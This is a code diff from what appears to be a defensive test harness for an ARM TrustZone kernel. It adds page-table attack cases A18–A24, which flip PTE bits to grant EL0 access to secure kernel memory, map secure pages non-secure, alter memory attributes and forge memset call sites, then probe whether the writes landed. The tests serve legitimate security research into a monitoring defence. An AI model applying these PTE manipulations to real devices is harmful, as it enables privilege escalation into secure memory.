+	case 20: { /* A18: EL0-ACCESS — AP_EL0 + nG=1 on secure kernel page.
+		    * Core target required: escalation is "TA reaches kernel
+		    * memory". Target = attack_rw_page (tee_ram_rw). */
+
+		/* Pre-flip canary: EL1 stores a distinctive byte into the
+		 * kernel page. Post-flip LDTRB (unprivileged load from EL1)
+		 * reads it back — proves EL0 permissions now grant access. */
+		attack_rw_page[0] = 0x42;
+		dsb();
+
+		uint64_t *pte = attack_find_l3_entry((vaddr_t)attack_rw_page);
+		uint64_t v = *pte;
+
 		v |= LOWER_ATTRS(AP_UNPRIV);
 		v |= LOWER_ATTRS(NON_GLOBAL);
+		DMSG("A18: kernel L3 PTE 0x%lx -> 0x%lx (EL0-access, nG)",
+		     *pte, v);
+		dsb(); *pte = v; dsb(); tlbi_all(); isb();
+
+		/* Baseline observation: LDTRB performs the load with EL0
+		 * permissions from within EL1. Pre-flip would fault (kernel
+		 * page, no EL0 access); post-flip on baseline it reads the
+		 * canary. Unreachable on defended (EL0-ACCESS panic above). */
+		uint8_t rb;
+		asm volatile("ldtrb %w0, [%1]"
+			     : "=r"(rb) : "r"(&attack_rw_page[0]));
+		IMSG("A18 baseline: ldtrb (as EL0) read 0x%x from kernel VA %s",
+		     rb,
+		     (rb == 0x42) ? "-- EL0 GAINED ACCESS to secure memory"
+				  : "-- unexpected value");
 		break;
-	case 5: /* CODE-WRITE VIOLATION (writable .rodata, non-exec) */
-		v &= ~LOWER_ATTRS(AP_RO);
+	}
+	case 21: { /* A19: GLOBAL — AP_EL0 + nG=0 on a TA page.
+		    * EL0-accessible global leaf: check gates on
+		    * AP_EL0 && !NG, independent of PA. TA target works. */
+		if (!target_va) { EMSG("A19 requires TA VA"); return; }
+		uint64_t *pte = attack_find_l3_entry((vaddr_t)target_va);
+		uint64_t v = *pte;
+
+		v |= LOWER_ATTRS(AP_UNPRIV);
+		v &= ~LOWER_ATTRS(NON_GLOBAL);
+		DMSG("A19: TA L3 PTE 0x%lx -> 0x%lx (AP_EL0, nG=0)",
+		     *pte, v);
+		dsb(); *pte = v; dsb(); tlbi_all(); isb();
 		break;
-	case 6: /* NS VIOLATION (secure page mapped NS=1) */
+	}
+	case 22: { /* A20: NS=1 on secure TA page + landing probe.
+		    * Defended: PTE store traps → NS VIOLATION panic.
+		    * Baseline: probe runs — writes canary through NS=1
+		    * mapping, reads back via NS=0 view to determine whether
+		    * secure memory received the write or the platform (SPMC
+		    * NS-IPA S2 walk) blocked it. See defense_a22_platform_masked
+		    * memory for the Hafnium NSA/NSW=10b interaction. */
+		if (!target_va) { EMSG("A20 requires TA VA"); return; }
+		uint64_t *pte = attack_find_l3_entry((vaddr_t)target_va);
+		uint64_t v = *pte;
+		uint64_t orig_pte = v;
+
 		v |= LOWER_ATTRS(NS);
+		DMSG("A20: TA L3 PTE 0x%lx -> 0x%lx (NS=1)", *pte, v);
+		dsb(); *pte = v; dsb(); tlbi_all(); isb();
+		DMSG("A20: PTE now 0x%lx", *pte);
+
+		/* Landing probe (executes only on baseline). */
+		volatile uint32_t *probe = (volatile uint32_t *)target_va;
+		uint32_t rb_ns, rb_s;
+
+		*probe = 0xC0DEF00DU;
+		dsb();
+		rb_ns = *probe;
+		IMSG("A20 probe (NS=1 view): wrote 0xC0DEF00D, read 0x%x",
+		     rb_ns);
+
+		dsb();
+		*pte = orig_pte;
+		dsb(); tlbi_all(); isb();
+		asm volatile("dc civac, %0" : : "r"(probe) : "memory");
+		dsb(); isb();
+
+		rb_s = *probe;
+		IMSG("A20 probe (NS=0 view): read 0x%x — %s",
+		     rb_s,
+		     (rb_s == 0xC0DEF00DU) ? "HARM LANDED in secure memory"
+					   : "harm NOT in secure memory");
 		break;
-	case 7: /* MEM-TYPE VIOLATION (secure page, Device attr) */
+	}
+	case 23: { /* A21: MEM-TYPE — Device attr on secure TA page.
+		    * Any secure PA with AttrIdx ∉ {1,3} panics. TA target
+		    * (ta_ram is secure) exercises the check. */
+		if (!target_va) { EMSG("A21 requires TA VA"); return; }
+		uint64_t *pte = attack_find_l3_entry((vaddr_t)target_va);
+		uint64_t v = *pte;
+
 		v &= ~LOWER_ATTRS(ATTR_INDEX_MASK);
 		v |= LOWER_ATTRS(ATTR_DEVICE_nGnRnE_INDEX);
+		DMSG("A21: TA L3 PTE 0x%lx -> 0x%lx (Device attr)",
+		     *pte, v);
+		dsb(); *pte = v; dsb(); tlbi_all(); isb();
 		break;
-	case 8: /* SHAREABILITY VIOLATION (secure page, SH != ISH) */
+	}
+	case 24: { /* A22: SHAREABILITY — clear ISH on secure TA page.
+		    * Any secure PA with SH != 0b11 panics. */
+		if (!target_va) { EMSG("A22 requires TA VA"); return; }
+		uint64_t *pte = attack_find_l3_entry((vaddr_t)target_va);
+		uint64_t v = *pte;
+
 		v &= ~LOWER_ATTRS(ISH);
+		DMSG("A22: TA L3 PTE 0x%lx -> 0x%lx (SH cleared)", *pte, v);
+		dsb(); *pte = v; dsb(); tlbi_all(); isb();
 		break;
-	default:
-		EMSG("pgtable_attack: unknown attack_type %lu", attack_type);
-		return;
 	}
 
-	DMSG("pgtable_attack %lu: VA 0x%" PRIxVA " PTE 0x%" PRIx64
-	     " -> 0x%" PRIx64, attack_type, target, *pte, v);
+	/* ────────── Fast-path abuse (A23, A24) ────────── */
 
-	dsb();
-	*pte = v;		/* the attack: store into a tracked L3 */
-	dsb();
-	tlbi_all();
-	isb();
+	case 25: { /* A23: memset with forged LR — blr into memset from a
+		    * non-standard call site. Volatile function pointer forces
+		    * blr instead of bl memset; LR-4 is not a bl-memset
+		    * encoding, so validate_bl_memset panics. Companion to
+		    * A24 which exercises the x1 gate specifically. */
+		if (!target_va) { EMSG("A23 requires TA VA"); return; }
+		uint64_t *l2 = attack_get_l2((vaddr_t)target_va);
+		void *(*volatile ms)(void *, int, size_t) = memset;
 
-	DMSG("pgtable_attack %lu: PTE now 0x%" PRIx64, attack_type, *pte);
+		DMSG("A23: blr into memset targeting thread L2 %p", l2);
+		(void)ms(l2, 0xAB, 8);
+		dsb();
+		break;
+	}
+	case 26: { /* A24: memset with non-zero fill via a real bl memset.
+		    * Volatile size defeats GCC's inline substitution so a real
+		    * bl memset is emitted → LR check passes. x1=0xAB fails the
+		    * fast-path's x1 gate; fall-through to SAS check panics on
+		    * SAS=0 with x1=0xAB visible in the panic string. */
+		if (!target_va) { EMSG("A24 requires TA VA"); return; }
+		uint64_t *l2 = attack_get_l2((vaddr_t)target_va);
+		volatile size_t sz = 8;
+
+		DMSG("A24: bl memset(l2=%p, 0xAB, sz=8)", l2);
+		memset(l2, 0xAB, sz);
+		dsb();
+		break;
+	}
+
+	default:
+		EMSG("pgtable_attack: unknown A# / cmd_id %lu", attack_type);
+		return;
+	}
 }
 /* ── VMI PAGE-TABLE ATTACK TEST END ──────────────────────────── */
 
